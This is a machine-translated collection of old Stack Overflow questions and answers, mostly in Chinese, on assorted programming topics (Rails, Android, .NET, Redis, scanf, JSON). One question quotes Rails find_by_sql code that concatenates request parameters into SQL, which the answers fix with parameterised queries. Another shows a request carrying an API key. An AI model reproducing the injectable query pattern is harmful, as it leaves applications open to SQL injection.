## 回答 #1

> 赞同：2
> 
> 时间：2012-04-10T08:01:04.697

UAC 是一项安全功能。您的用户可能无法将其关闭，因此您需要在设计应用程序时考虑到 UAC。

查看这些链接以获取有关如何使用 UAC 进行编程的一些背景信息：

[http://www.codeproject.com/Articles/17968/Making-Your-Application-UAC-Aware](http://www.codeproject.com/Articles/17968/Making-Your-Application-UAC-Aware)

[http://archive.msdn.microsoft.com/elevatedprivilegeuac](http://archive.msdn.microsoft.com/elevatedprivilegeuac)

[http://www.codeproject.com/Articles/16796/Riding-the-Vista-UAC-elevator-up-and-down](http://www.codeproject.com/Articles/16796/Riding-the-Vista-UAC-elevator-up-and-down)

# .net - 新的 Uri 保留转义字符

> ID：10084175
> 
> 赞同：3
> 
> 时间：2012-04-10T06:35:45.110
> 
> 标签：.net, uri, special-characters

我想从包含转义字符的字符串中实例化一个新的 Uri。

```
Dim sUri as String = "http://foo.bar/path/to/file_with%2fpercent?query=params"
Dim uUri as New Uri(sUri)
Console.WriteLine(uUri) 
```

>>>>

```
http://foo.bar/path/to/file_with/percent?query=params 
```

我怎样才能保持`%2f`？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-23T09:42:33.660

使用例如以下代码（注意：仅适用于绝对 URL！）：

```
Sub DownloadFileToDisc (downloadUrl As String)
    Dim MyWebClient As New System.Net.WebClient()
    Dim downloadUri As New UriWithCorrectDataEncoding(downloadUrl)
    MyWebClient.DownloadFile(downloadUri, localFilePath)
End Sub

''' <summary>
''' Original behaviour of System.Uri.ToString returns unescaped characters in query parameters - a behaviour which corrupts URLs like http://domain.com/?forwardurl=module%3dInvoice%26action%3dCreatePDF4Mail%26return_module%3dInvoice into http://domain.com/?forwardurl=module=Invoice&amp;action=CreatePDF4Mail&amp;return_module=Invoice
''' </summary>
''' <remarks></remarks>
Private Class UriWithCorrectDataEncoding
    Inherits Uri

    Public Sub New(url As String)
        MyBase.New(url)
    End Sub

    Public Overrides Function ToString() As String
        Return MyBase.AbsoluteUri
    End Function

End Class 
```

# ruby-on-rails - 如何使用 RSPEC 测试多部分帖子

> ID：10084177
> 
> 赞同：2
> 
> 时间：2012-04-10T06:36:08.853
> 
> 标签：ruby-on-rails, ruby-on-rails-3, rspec

我正在尝试使用以下代码使用 RSPEC 测试多部分/表单帖子：

```
@req = { :post => @attr }
  lambda {
    post :create, :POSTDATA => @req, :format => :json
  }.should change(Post, :count).by(1) 
```

但我收到以下错误：

```
undefined method `stringify_keys' for "post":String 
```

POSTDATA 是多部分表单名称。

测试多部分请求的正确方法是什么？

编辑：

我发现像上面那样构建请求只是构建了一个嵌套的 JSON 请求。如何构建多帖子/表单请求？

我想构建一个看起来像这样的多部分请求：

```
POST /api/posts.json HTTP/1.1
Accepts: application/json
X-API-KEY: 7d867d16a5e25337b6d7857965f812bee73b76ac
Content-Length: 288
Content-Type: multipart/form-data; boundary=syoYQUQsGwI2XqShQimFdv2QSe-_GYbjVx40T1kS
Host: 10.0.2.2:3000
Connection: Keep-Alive
User-Agent: Apache-HttpClient/UNAVAILABLE (java 1.4)

--syoYQUQsGwI2XqShQimFdv2QSe-_GYbjVx40T1kS
Content-Disposition: form-data; name="POSTDATA"
Content-Type: application/json; charset=UTF-8
Content-Transfer-Encoding: 8bit

{"tags":["dffdff"],"location_id":3,"post":{"content":"test #dffdff"}}
--syoYQUQsGwI2XqShQimFdv2QSe-_GYbjVx40T1kS-- 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-16T10:38:33.003

我认为您尝试创建一个新对象（创建方法），同时仅向其传输哈希。

尝试 ：

```
 post :create, {:model_name => {hashed_parameter}, :format => :json } 
```

并且不要让它恒定 POSTDATA ，只需使用 :post_data 。

并且还建议使用 Factory Girl 来创建对象并用于测试。

# sql - 如何清理 Rails 中的 SQL？

> ID：10084179
> 
> 赞同：0
> 
> 时间：2012-04-10T06:36:23.610
> 
> 标签：sql, ruby-on-rails-3, sql-injection, sanitization, find-by-sql

我是这个 RoR 世界的新手，

我的 RoR 应用程序中有许多 SELECT sql 查询，像这样

```
@replies  = Offerreply.find_by_sql ("SELECT * FROM offerreplies WHERE 
offer_id="+params [:offer_id]) 
```

有些像上面一样非常简单，有些是非常复杂的 JOINS。他们中的大多数人都患有**SQL 注入** 问题。那么，如何清理 RoR 中的此类 SQL 语句？

编辑：如何在具有 JOINS 和子查询的 SQL 语句中处理相同的问题？像这样的东西

```
@to_be_approved=Beneficiary.find_by_sql("SELECT * FROM beneficiaries WHERE project_id="+params[:id]+" AND NOT id IN (SELECT beneficiaries.id FROM beneficiaries INNER JOIN beneficiaryloans ON beneficiaryloans.beneficiary_id=beneficiaries.id AND beneficiaryloans.hfi_id="+session[:id].to_s+" AND beneficiaries.status_id=4) AND cso_id IN(SELECT user_id FROM user_projects INNER JOIN users ON  user_projects.user_id=users.id AND users.user_type_id=2)") 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-10T06:44:42.513

如果您使用的是 Rails 3（正如您的标签所说），您可以这样做。

```
@replies  = Offerreply.where("offer_id = ?", params[:offer_id]) 
```

[您可以在 Rails 站点上](http://guides.rubyonrails.org/active_record_querying.html#array-conditions)找到更多信息。

编辑：如果你有多个条件，你可以这样做。

```
@replies  = Offerreply.where("offer_id = ? AND second = ?", params[:offer_id], params[:second]) 
```

edit2：并查看 Micha 对多个连接的回答。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-04-10T07:03:54.537

Waynn Lue 的回答很好，但它没有显示如何查询连接表。你可以这样做：

```
Offerreply.joins(:offers).where('offers.id', params[:offer_id]) 
```

或者：

```
Offerreply.joins(:offers).where(:offers => { :id => params[:offer_id] }) 
```

再说一遍：如果你想使用 Rails，你真的必须学习[Active Record Query Interface](http://guides.rubyonrails.org/active_record_querying.html)。[这是关于 joins 的段落](http://guides.rubyonrails.org/active_record_querying.html#joining-tables)。如果无法通过“正常”界面执行此操作，请仅使用 find_by_sql。

# android - 如何在 android 中动态地为 listView 充气

> ID：10084184
> 
> 赞同：0
> 
> 时间：2012-04-10T06:36:43.207
> 
> 标签：android, listview

请帮助我动态创建一个列表视图并用一些运行时数据对其进行膨胀.....

提前致谢。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-10T06:49:49.937

扩展 ListActivity 类并创建 ArrayList 对象并使用 ArrayAdapter 添加值。

```
public class ListViewDemo extends ListActivity {

//LIST OF ARRAY STRINGS WHICH WILL SERVE AS LIST ITEMS
ArrayList<String> listItems=new ArrayList<String>();

//DEFINING STRING ADAPTER WHICH WILL HANDLE DATA OF LISTVIEW
ArrayAdapter<String> adapter;

//RECORDING HOW MUCH TIMES BUTTON WAS CLICKED
int clickCounter=0;

@Override
public void onCreate(Bundle icicle) {

super.onCreate(icicle);
setContentView(R.layout.main);
adapter=new ArrayAdapter<String>(this,
    android.R.layout.simple_list_item_1,
    listItems);
setListAdapter(adapter);
}

//METHOD WHICH WILL HANDLE DYNAMIC INSERTION
public void addItems(View v) {
 listItems.add("Clicked : "+clickCounter++);
 adapter.notifyDataSetChanged();
}
} 
```

也可以使用布局xml定义，

在您的项目 res/layout/main.xml 文件夹中创建一个 xml 布局

```
<?xml version="1.0" encoding="utf-8"?>
<LinearLayout
xmlns:android="http://schemas.android.com/apk/res/android"
android:orientation="vertical"
android:layout_width="fill_parent"
android:layout_height="fill_parent" >
<Button
android:id="@+id/addBtn"
android:text="Add New Item"
android:layout_width="fill_parent"
android:layout_height="wrap_content"
android:onClick="addItems"/>
<ListView
android:id="@android:id/list"
android:layout_width="fill_parent"
android:layout_height="fill_parent"
android:drawSelectorOnTop="false"
/>
</LinearLayout> 
```

# iphone - 如何压缩多个图像并从 iPhone 应用程序上传到 FTP 服务器？

> ID：10084186
> 
> 赞同：1
> 
> 时间：2012-04-10T06:36:45.580
> 
> 标签：iphone, ios, image, compression, ftp-server

我正在开发 iPhone 应用程序来拍照并将照片上传到 FTP 服务器。从我想`compress nearly 25 photos`由用户使用的应用程序和`upload the compressed photos in FTP server`. 谁能指导我`compress the images(Like ZIP)`将压缩照片上传到 FTP 服务器上。请帮我。提前致谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-10T10:55:37.977

你一定要试试这个库 -> [http://code.google.com/p/objective-zip/](http://code.google.com/p/objective-zip/)。我在压缩多达 3 张图片时取得了不错的效果。猜猜25也可以

编辑：

* * *

这是我的一篇文章，其中有一些您可以使用的示例代码:)

[如何将我的 Zip 文件转换为 NSData 以将我的 Zip 文件作为附件通过电子邮件发送](https://stackoverflow.com/questions/7809359/how-can-i-convert-my-zip-file-to-nsdata-to-email-my-zip-file-as-an-attachment)

# version-control - 如何从 code.google.com 下载源代码

> ID：10084188
> 
> 赞同：1
> 
> 时间：2012-04-10T06:36:47.123
> 
> 标签：version-control, mercurial

我需要下载 code.google.com 上的项目的源代码我无法执行结帐部分中给出的命令。我该怎么做？这是要在命令提示符下执行的命令。

```
hg clone https://code.google.com/p/gpspeedo/ 
```

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-04-10T06:39:06.233

`hg`是善变的命令。您需要安装 mercurial 才能执行此操作。

在[这里](http://mercurial.selenic.com/)查看有关 mercurial 的信息

# mmo - 如何在游戏中实现相对计时器

> ID：10084194
> 
> 赞同：1
> 
> 时间：2012-04-10T06:37:31.740
> 
> 标签：mmo

我们的游戏是 MMO 游戏，我们的逻辑服务器当然有游戏循环。为了使这些逻辑模块易于编写，我们提供了一个定时器模块，它支持注册一个真正的定时器并在可能的时候触发它。在游戏循环中，我们将系统时间（以毫秒为单位）传递给定时器模块，定时器管理器将检查是否有一些定时器可以被触发。例如，要更新玩家/怪物的位置，当玩家开始移动时，我们每 200 毫秒更新一次玩家位置。

但是当游戏循环运行过多的逻辑时，它会在单帧中使用过多的时间，并且下一帧，一些计时器会比实际时间慢。这实际上会导致一些错误。例如，如果在一帧中花费了 1 秒，而在下一帧中，实际时间为 1000 毫秒，而移动定时器已在 800 毫秒内调度，因此定时器已在 1000 毫秒触发，比预期的时间慢。

那么有没有更好的解决方案来解决这个问题呢？比如我们可以实现一个定时器，只依赖于我们的游戏，不依赖于真实的电脑时间？

# c# - 如何抑制 wpf 中的 UI 异常？

> ID：10084196
> 
> 赞同：0
> 
> 时间：2012-04-10T06:37:39.993
> 
> 标签：c#, wpf, user-interface, exception

我正在创建设计应用程序，用户可以在其中将控件拖放到某个表面。工具栏中的某些控件可能包含损坏的逻辑并在注入到表面时生成异常。当它们被删除时，我想抑制来自 3rd 方控件的一些未处理的异常。

我想抑制这个 UI 异常并显示某种弹出窗口：

```
workArea.Dispatcher.UnhandledException += MainContainerDispatcherUnhandledException 
```

是否可以根据来源进行处理和压制？

谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-10T06:47:11.897

您可以使用[AppDomain.UnhandledException](http://msdn.microsoft.com/en-us/library/system.appdomain.unhandledexception.aspx)并且如果您收到它，请确定实现它的控件，并且

*   或向用户显示用户友好的消息
*   或显示一些红色表面（或多或少像 VS 那样）
*   或使用带有动画的装饰器（很酷，但要编程更多）

希望这可以帮助。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-10T08:41:06.440

有必要处理事件：`e.Handled=true;`. [DispatcherUnhandledExceptionEventArgs.Handled](http://msdn.microsoft.com/en-us/library/system.windows.threading.dispatcherunhandledexceptioneventargs.handled.aspx)。[WPF 应用程序的未处理异常处理程序](http://www.codeproject.com/Articles/90866/Unhandled-Exception-Handler-For-WPF-Applications.aspx)

# android - 如何在安卓模拟器中的手机内存中创建目录

> ID：10084197
> 
> 赞同：0
> 
> 时间：2012-04-10T06:37:46.900
> 
> 标签：android, directory, emulation

我想在 android 的 android Emulator 的手机内存中创建目录 .. 如何在 android 模拟器而不是 SDCard 的手机内存中创建目录

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-10T06:46:43.967

以下代码可以帮助您在手机内存中创建目录：

```
 File f = new File(getFilesDir()+"/abc");
    if(!f.isDirectory())
        Log.d("dir", f.mkdir()? "Directory created": "Directory not created"); 
```

实际上**getFilesDir()**返回内部存储器`file`文件夹的路径，并允许您在其中创建更多文件和/或目录。

# android - 我们如何使用密码在 android 中播放私人 Youtube 视频？

> ID：10084200
> 
> 赞同：1
> 
> 时间：2012-04-10T06:38:06.903
> 
> 标签：android, youtube

我想在我的安卓设备上播放**私人**Youtube 视频，有人知道吗？

网址：http://www.youtube.com/watch?v=a1fuuhECPSI&feature=g-upl&context=G2a4cbe5AUAAAAAAAAAA

我们如何在 youtube url 中传递参数，例如用户名和密码？

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-10T07:00:07.787

试试这样。。

在您开始观看视频之前..[创建一个带有 textinput 的对话框以获取密码](https://stackoverflow.com/questions/3061249/opening-a-dialog-with-text-input-from-within-a-view-in-android)。使用 sharedpreferences 保存您的密码..并使用输入的密码进行检查...如果匹配..然后开始意图..

# opengrok - 使用opengrok搜索历史

> ID：10084204
> 
> 赞同：4
> 
> 时间：2012-04-10T06:38:44.013
> 
> 标签：opengrok

我一直在使用 OPENGROK 搜索我的 SVN 代码存储库。它需要一个签出版本的存储库来索引它。当我在我的系统上签出版本时，我已经能够实现搜索存储库。当我尝试搜索存储库的历史记录时，我被卡住了。我没有得到任何帮助。谁能建议我该怎么做。此外，如果我想更新索引而不是一直创建新索引，如何实现它。任何贡献都会对我有很大的帮助。感谢您的时间和帮助。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-22T09:47:05.210

你用的是哪个版本的opengrok？opengrok 可以通过两种方式显示历史信息

1.  如果 opengrok 和 subversion 安装在同一本地服务器上或
2.  如果您的 opengrok 版本 > 0.7，也可以从远程 svn 获取历史记录。

参考：

```
Note: A local CVSROOT (or SVN if opengrok version less than 0.7) repository must be available. File history will not be fetched from a remote server for CVS (& SVN if opengrok version less than 0.7) !. 
```

[https://github.com/OpenGrok/OpenGrok/wiki/How-to-install-OpenGrok](https://github.com/OpenGrok/OpenGrok/wiki/How-to-install-OpenGrok)

更新 1：还有一件事要验证

bin 目录中的 shell 脚本“OpenGrok”将有一个名为“OPENGROK_REMOTE_REPOS_OFF”的选项。检查它在脚本中是否应为空白。

# php - PHP Redis 错误：未捕获的异常“RedisException”

> ID：10084205
> 
> 赞同：7
> 
> 时间：2012-04-10T06:38:57.133
> 
> 标签：php, redis

我使用 Redis 构建了一个 IOS SNS 应用程序（用于 restful api）。随着越来越多的用户使用它，错误发生了。

它抛出：

```
Uncaught exception 'RedisException' with message 'read error on connection' 
in /data1/www/htdocs/11/iossns/Model/Core/Redis.php 
```

我不知道如何解决这个问题。

你能帮我吗？

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-08-04T09:06:59.553

您使用的是什么 PHP-to-Redis 库？[这是来自 Redis 的官方列表](http://redis.io/clients#PHP)。你的网络服务器是什么？（Apache、nginx 等）PHP 是如何运行的？（CGI、FPM、mod_php 等）

[这是 phpredis 中相同异常消息的线程](https://github.com/nicolasff/phpredis/issues/70)。事实证明 phpredis 目前不支持与 php-fpm 的持久连接。phpredis 2.2.3 版有一些连接处理更改，可能会降低问题的频率。

我建议检查您的 Redis 连接器配置以...</p>

1.  禁用持久连接
2.  启用连接重试
3.  增加日志详细程度

您还可以考虑对`default_socket_timeout`php.ini 进行调整（通常会增加）。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2021-02-25T17:53:50.217

在 Ubuntu 20.04 中，我发现 systemctl 正在尝试重新启动服务，因为它找不到 /run/redis/redis-server.pid redis-server.service: Failed with result 'timeout'。

```
Feb 25 17:51:09 artamredis systemd[1]: Failed to start Advanced key-value store.
Feb 25 17:51:09 artamredis systemd[1]: redis-server.service: Scheduled restart job, restart counter is at 18.
Feb 25 17:51:09 artamredis systemd[1]: Stopped Advanced key-value store.
Feb 25 17:51:09 artamredis systemd[1]: Starting Advanced key-value store...
Feb 25 17:51:09 artamredis systemd[1]: redis-server.service: Can't open PID file /run/redis/redis-server.pid (yet?) after start: Operation not permitted 
```

为了解决它在 /etc/redis/redis.conf 文件中找到

```
pidfile /var/run/redis_6379.pid 
```

并更改为

```
pidfile /run/redis/redis-server.pid 
```

# java - Java EE项目的静态代码分析工具

> ID：10084211
> 
> 赞同：0
> 
> 时间：2012-04-10T06:39:30.727
> 
> 标签：java, jakarta-ee, tortoisesvn, static-analysis

Java EE 项目有哪些可用的静态代码分析工具。我希望该工具是独立的，或者它应该与 tortoise SVN 集成（如插件）。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-27T06:27:39.003

我试过 PMD 它工作正常。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-10T07:24:40.500

这是独立工具： [源监视器](http://www.campwoodsw.com/sm20.html)

或[Sonar](http://www.sonarsource.org/)，可用作 stanalone 或与 maven/ant 一起使用。

# asp.net - 我们如何配置只有 10 个用户访问 asp.net 网站

> ID：10084215
> 
> 赞同：2
> 
> 时间：2012-04-10T06:39:56.743
> 
> 标签：asp.net

```
< system.web >

< authorization >

< allow roles = " User " />

< deny users = " * " />

</ authorization >

</ system.web > 
```

在哪个部分我写代码和我写什么来配置只有 10 个用户访问 asp.net 网站

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-10T06:51:29.003

没有内置的 ASP.NET 功能。您将不得不编写自己的代码。

一个好的起点是计算 and 中当前用户的数量`Session_Start`，`Session_End`但请注意，[您无法可靠地检测到用户在没有“注销”的情况下关闭了浏览器的事实](https://stackoverflow.com/questions/621744/how-to-handle-session-end-in-global-asax)。

* * *

编辑：如果您使用 ASP.NET Membership 提供程序，[Membership.GetNumberOfUsersOnline](http://msdn.microsoft.com/en-us/library/system.web.security.membership.getnumberofusersonline%28v=VS.100%29.aspx#Y0)可以为您*估计*当前有多少用户正在使用您的应用程序。它报告“*当前[应用程序]的用户数，其中最后活动日期大于当前时间减去[某些可配置的时间窗口]。* ”

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-10T06:54:29.907

您可以在机器配置中设置 maxconnection

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-10T07:52:43.310

您想同时限制用户数还是会话数。ASP.NET 成员资格提供程序是限制用户数量的好选择。

您可以限制 web.config 中允许的最大会话数。

```
<system.webServer> 
  <asp>
    <session max =""/>
  </asp>
</system.webServer> 
```

这里还有一个描述 IIS 中会话配置的[链接](http://www.iis.net/ConfigReference/system.webServer/asp/session)。

# java - BigO 表示法的复杂性

> ID：10084219
> 
> 赞同：0
> 
> 时间：2012-04-10T06:40:10.350
> 
> 标签：java, big-o

我一直在做一些问题，但没有提供答案，所以我想知道我的答案是否正确

a) 假设 a[i....j] 是一个具有 n 个元素的整数数组并且 x 是一个整数

```
int front, back;

while(i <= j) {

    front = (i + j) / 3; 
    back = 2 * (i + j) / 3;

    if(a[front] == x)
        return front;
    if (a[back] ==x)
        return back;

    if(x < a[front])
        j = front - 1;
    else if(x > a[back])
        i = back+1;
    else {
        j = back-1;
        i = front + 1;
    }
} 
```

我的答案是 O(1)，但我觉得我错了。

二）

```
public static void whatIs(int n) {
    if (n > 0)
        System.out.print(n+" "+whatIs(n/2)+" "+whatIs(n/2));
} 
```

ans：我不确定是 log4n 还是 logn，因为递归发生了两次。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-10T06:49:59.840

一）是的。 `O(1)`是错的。您将循环多次，这取决于`i`, `j`, `x`... 和数组的内容。算出你在*最好*和*最坏*情况下绕圈的次数。

B)`log(4*n)`使用`log(a*b) -> log(a) + log(b)`（基础高中数学）进行化简，然后应用大 O 的定义。

但这也不是正确的答案。再一次，您应该回到第一原则并计算为给定参数值调用该方法的次数`n`。并进行归纳证明。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-10T06:49:28.877

两个答案都不正确。

在每次迭代的第一个示例中，您要么找到数字，要么将间隔的长度缩小 1/3。即，如果长度曾经是 n，则将其设为 (2/3)*n。最坏的情况是你在最后一次迭代中找到 x - 当间隔的长度为 1 时。所以就像二进制搜索一样，复杂性是通过对数计算的：复杂性是 O(log [3/2] (n)) 而这实际上只是 O(log(n))

在给定数字 n 的第二个示例中，您执行 n/2 所需操作数的两倍。从 n = 0 和 n = 1 开始，使用归纳法证明复杂度实际上是 O(n)。

希望这可以帮助。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-10T07:10:07.167

A）这个算法看起来类似于[黄金分割搜索](http://en.wikipedia.org/wiki/Golden_section_search)。在分析复杂性时，有时更容易想象如果我们*扩展*数据结构而不是收缩它会发生什么。可以这样想：每个循环从搜索间隔中删除三分之一。这意味着，如果我们确切地知道某个长度需要多长时间，如果我们被允许再次循环，我们可以增加 50% - 指数增长。因此，搜索算法必须具有复杂度 O(log *n* )。

B) 每次我们添加一个“层”函数调用时，我们都需要将它们的数量加倍（因为函数总是调用自己两次）。换句话说，给定一定的长度和时间消耗，将*n*加倍也需要在最后一层中调用两倍的函数。算法是 O( *n* )。

# c - How do we test the return values from the scanf() function?

> ID：10084224
> 
> 赞同：8
> 
> 时间：2012-04-10T06:40:29.040
> 
> 标签：c, scanf

I want to confirm if a value returned from the `scanf()` function is a floating number or not. How can I do that? My code is not running as it should if the wrong data types are supplied to the `scanf()` function. Similarly, how would I confirm if a value returned is a character string or not?

* * *

## 回答 #1

> 赞同：18
> 
> 时间：2012-04-10T06:48:49.047

`scanf()` et al return the number of successful conversions.

If you have:

```
scanf("%f", &f); 
```

you should test:

```
if (scanf("%f", &f) == 1)
    ...all OK...
else
    ...EOF or conversion failure... 
```

If you have several conversions, check that they all completed. If you're using `%n` 'conversions', they aren't counted.

Although `scanf()` does return EOF on EOF, you should not test for that — you should always check primarily that you got the number of conversions you expected. For example, consider the buggy code:

```
while (scanf("%f %d %s", &f, &i, s) != EOF)  // Here be BUGS!
    ...loop body... 
```

If you type `3.14 x23 yes`, then you will have an infinite loop because `scanf()` will return 1 on the first iteration (it successfully converted 3.14), and 0 thereafter (not EOF).

You might be OK with:

```
while ((rc = scanf("%f %d %s", &f, &i, s)) != EOF)
{
    if (rc != 3)
        ...oops data problems...
    else
        ...all OK...
} 
```

* * *

Judging from previous questions, you should be looking at using `fgets()` (or possibly POSIX `getline()`) to read lines of data, and then using `sscanf()` or even functions like `strtol()` and `strtod()` to read particular values from the line. If you use `sscanf()`, the comments made above about checking the number of successful conversions still apply.

I don't use `scanf()` in production code; it is just too damn hard to control properly. I regard it as almost suitable for beginning programs — except that it causes lots of confusion. On the whole, the best advice is 'stay clear of `scanf()` and `fscanf()`'. Note that that does not mean you have to stay clear of `sscanf()`, though some caution is needed even with `sscanf()`.

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-04-10T06:52:00.410

The return value of `scanf` indicates the number of items successfully read and assigned to your variables, or EOF:

> These functions return the number of input items successfully matched and assigned, which can be fewer than provided for, or even zero in the event of an early matching failure.
> 
> The value EOF is returned if the end of input is reached before either the first successful conversion or a matching failure occurs. EOF is also returned if a read error occurs, in which case the error indicator for the stream (see ferror(3)) is set, and errno is set indicate the error.

If the `int` returned by `scanf` has a value less than the amount of input specifiers (or at least the specifiers which require an argument to be passed) in the format string, then you can assume something went wrong.

However, if you want to perform a more thorough validation of your floating point number, then you should consider using `strtod()`. ie. for the input `"1.23abc"`, `scanf` would store `1.23` into your variable and tell you that everything went well, but with `strtod` you can check if the last character converted is actually the end of the string being parsed.

# javascript - 使用 VBA 将数据从 Excel 解析到 IE

> ID：10084229
> 
> 赞同：1
> 
> 时间：2012-04-10T06:40:39.773
> 
> 标签：javascript, html, internet-explorer, vba

我正在尝试使用 VBA 将 Excel 工作表中的一些数据解析到 IE 页面，并且在将数据发送到一个看起来像特殊组合框的对象时遇到了困难。

事实上，该特定页面上有 2 个组合框定义如下：

### 组合框 1：

```
<selectname="material[]">
<optionvalue="3">AL</option>
<optionvalue="2">TL</option>
<optionvalue="1">GL</option> 
```

### 组合框 2：

```
<divclass="ui-widget">
<selectname="partner" id="ID" style="width:300px">
<optionvalue="no"></option>
<optionvalue="3766">COMPANY 1</option>
<optionvalue="3792">COMPANY2</option>
<optionvalue="3764">COMPANY 3</option>
<optionvalue="3071">COMPANY 4</option> 
```

虽然我可以使用以下代码将数据发送到组合框 1：

```
IE.document.all.Item("material[]").selectedIndex = "2" 
```

似乎相同的代码在第二个组合框上不起作用：

```
IE.document.all.Item("partner").selectedIndex = "3766" 
```

并且没有数据显示（也不会触发任何错误）。

你有什么想法我怎么能做到这一点？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-10T07:06:29.843

您似乎将a的**值**`select`与其**index**混淆了。这两件事是无关的。

# javascript - jquery中的问题，同时使表行可点击，其中包含表数据中的链接

> ID：10084230
> 
> 赞同：1
> 
> 时间：2012-04-10T06:40:41.627
> 
> 标签：javascript, jquery

我有一个包含作为表格数据的链接的表格，我想让表格行可点击。为此，我使用以下 jQuery。

这个的功能就像

1.  单击行时，它会调用一个操作，并且该操作的数据将显示在新窗口中。
2.  当您单击表数据链接时，它将在新窗口中打开链接，并且对行单击没有任何操作。

代码：

```
jQuery( function($) {
    $('tbody tr[data-href]').addClass('clickable').click( function() {
        window.open($(this).attr('data-href'),'mywin','left=20,top=20,width=1240,height=500,toolbar=1,resizable=0');
    }).find('a').hover( function() {
        $(this).parents('tr').unbind('click');
    }, function() {
        $(this).parents('tr').click( function() {
            window.location = $(this).attr('data-href');
        });
    });
}); 
```

现在的问题是，当我第一次单击表格数据链接，然后单击表格行时，它没有在新窗口中打开，而是当前页面重定向到预期在新窗口中打开的页面。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-10T07:42:52.490

你走错路了。

而不是搞乱取消绑定和重新绑定单击事件，只需处理锚元素的事件并检查处理函数本身已单击的内容并执行正确的操作。新代码将是：

```
jQuery( function($) {
    $('tbody tr[data-href]').addClass('clickable');
    $('tbody').on('click', 'tr[data-href],a', function(evt) {
        if (this.nodeName.toLowerCase() === "a") {
            document.location = this.href;
        }
        else {
            window.open($(this).attr('data-href'),'mywin','left=20,top=20,width=1240,height=500,toolbar=1,resizable=0');
        }
        evt.stopPropagation();
        return false;
    });
});​ 
```

[现场测试用例](http://jsfiddle.net/QTxqr/4/)。

# javascript - 如何通过Javascript解析多维JSON数据

> ID：10084234
> 
> 赞同：10
> 
> 时间：2012-04-10T06:40:57.167
> 
> 标签：javascript, json

我如何解析这种类型的 json 数据，获取“结果”以获取单个值，如邮政编码、状态等

```
{
    "row": [
        {
        "id": "5",
        "name": "test",
        "email": "test@test.com",
        "street": "mystreet",
        "city": "mycity",
        "state": "mystate",
        "zipcode": "123456",
        "myimage": "image.gif"}
    ]
}​ 
```

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2012-04-10T06:43:45.087

首先，您需要使用[JSON.parse解析该字符串](https://developer.mozilla.org/en/JavaScript/Reference/Global_Objects/JSON/parse)

```
var myJson = JSON.parse(the_raw_data_string); 
```

它最终变成这样的对象：

```
var myJson = {
    "row": [
        {
        "id": "5",
        "name": "test",
        "email": "test@test.com",
        "street": "mystreet",
        "city": "mycity",
        "state": "mystate",
        "zipcode": "123456",
        "myimage": "image.gif"}
    ]
}​ 
```

访问项目：

```
myJson.row[0].id
myJson.row[0].name
myJson.row[0].street
//and so on... 
```

* * *

## 回答 #2

> 赞同：9
> 
> 时间：2012-04-10T06:46:33.420

您可以将 json 结果转换为 var，如下所示

```
var json = {
    "row": [
        {
        "id": "5",
        "name": "test",
        "email": "test@test.com",
        "street": "mystreet",
        "city": "mycity",
        "state": "mystate",
        "zipcode": "123456",
        "myimage": "image.gif"}
    ]
}​ 
```

然后将结果发送给另一个

```
var result = json.row; 
```

然后你可以遍历结果

```
for (var i = 0; i < result.length; i++) {
    var object = result[i];
    for (property in object) {
        var value = object[property];
        alert(property + "=" + value); // This alerts "id=5",  etc..
    }
} 
```

希望对你有帮助

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-04-10T07:03:09.777

再次在这里 jQuery 是你的好朋友

我已经[使用 jsfiddle](http://jsfiddle.net/sJHxR/)在您的数据行中发布了一个包含多条记录的示例

```
$(document).ready(function () {
var result = {
    "row": [
        {
        "id": "5",
        "name": "test",
        "email": "test@test.com",
        "street": "mystreet",
        "city": "mycity",
        "state": "mystate",
        "zipcode": "123456",
        "myimage": "image.gif"
        },
        {
        "id": "10",
        "name": "test2",
        "email": "test2@test.com",
        "street": "mystreet2",
        "city": "mycity2",
        "state": "mystate2",
        "zipcode": "7891011",
        "myimage": "image.gif"
        }
    ]
};

var oE = $("#output");
$.each(result.row, function(index, value) {
  //- extract target value like zipCode
  oE.append($("<li></li>").text(value.zipcode));

            });
});
​ 
```

希望这可以帮助。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2017-02-09T11:29:59.773

如果 json 数据是**原始**数据，则使用**json.parse。** 之后循环多维json数据。

```
data = {"employees":[
    { "firstName":"Anushka", "lastName":"shetty" },
    { "firstName":"Shreya", "lastName":"Saran" },
    { "firstName":"Kajal", "lastName":"Agarwal" }
]};

for (var key in data.employees) {   
    alert(data.employees[key].firstName) //alert Anushka, Shreya, Kajal
} 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-04-10T06:43:03.183

您可以使用 JQuery 每个功能：

```
$.each(myData.row, function(index,item) {
  // here you can extract the data
  alert (item.zipcode);
}); 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-04-10T06:43:29.457

使用`JSON.parse(jsonstring)`. 然后遍历对象/数组。

# python - doctests 中的链式异常

> ID：10084235
> 
> 赞同：4
> 
> 时间：2012-04-10T06:40:59.630
> 
> 标签：python, exception, python-3.x, doctest

